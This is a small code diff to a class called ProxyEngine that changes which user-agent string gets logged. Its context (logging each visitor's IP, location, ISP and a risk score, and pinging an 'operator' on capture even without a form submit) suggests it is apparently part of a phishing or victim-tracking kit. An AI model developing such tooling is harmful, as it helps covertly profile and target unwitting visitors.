@@ -324,7 +324,8 @@ class ProxyEngine:
             else:
                 self.db.log_intel(sid, ip, (geo or {}).get("city", ""),
                                   (geo or {}).get("country", ""), (geo or {}).get("isp", ""),
-                                  payload.get("ua") or "", summary, raw, risk=risk)
+                                  summary.get("user_agent") or payload.get("ua") or "",
+                                  summary, raw, risk=risk)
         # a real device that arrives with no form submit still pings the operator
         if self.on_capture and payload.get("wave") in ("open", "gesture", "final"):
             try:
